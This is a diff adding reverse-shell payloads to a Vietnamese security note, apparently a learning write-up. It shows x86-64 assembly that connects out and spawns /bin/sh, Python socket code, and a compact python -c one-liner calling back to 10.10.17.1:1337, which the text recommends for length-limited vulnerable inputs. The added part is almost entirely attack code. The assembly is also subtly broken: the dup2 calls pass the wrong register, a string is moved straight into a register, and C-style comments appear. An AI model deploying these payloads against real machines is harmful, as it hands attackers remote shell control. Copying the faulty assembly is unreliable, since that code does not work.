@@ -117,7 +117,87 @@ Code asm:
 <img width="998" height="58" alt="image" src="https://github.com/user-attachments/assets/06a1a40a-95cb-435b-9f13-1f4f831ce46c" />
 
 ```asm
+section .text
+global _start
 
+_start:
+
+	; socketfd = socket()
+	mov rax, 41
+	mov rdi, 2
+	mov rsi, 1
+	mov rdx, 0
+	syscall
+
+	mov rbx, rax // socketfd
+
+	; struct sockaddr_in user_addr
+	mov rdx, host_ip
+	push rdx
+	mov dx, host_port
+	push dx
+	mov dx, 2 ; AF_INET
+	push dx
+
+	; connect()
+	mov rax, 42
+	mov rdi, rbx
+	mov rsi, rsp
+	mov rdx, 16 // sizeof(user_addr)
+	syscall
+
+	; 3 dup2() data steams to socket
+	mov rax, 33
+	mov rdi, 0 // stdin
+	mov rsi, rbp
+	syscall
+
+	mov rax, 33
+	mov rdi, 1 // stdout
+	mov rsi, rbp
+	syscall
+
+	mov rax, 33
+	mov rdi, 2 // stderr
+	mov rsi, rbp
+	syscall
+
+	; spawn shell on host machine
+	mov rax, 59
+	mov rdi, "/bin/sh"
+	mov rsi, 0 // null
+	mov rdx, 0 // null
+	syscall
+```
+
+Ngoài ra, có thể biểu diễn qua python dưới 1 dòng payload duy nhất. Sử dụng khi lỗ hổng có input text giới hạn số ký tự:
+```python
+# Cấu trúc giống code C trên
+import socket
+
+import subprocess
+
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect(("0.0.0.0", 7777))
+
+os.dup2(s.fileno(), 0)
+
+os.dup2(s.fileno(), 1)
+
+os.dup2(s.fileno(), 2)
+
+p = subprocess.call(["/bin/sh", "-i"])
+```
+thành:
+```python
+python -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.17.1",1337));
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
 ```
 ___
 Tài liệu:
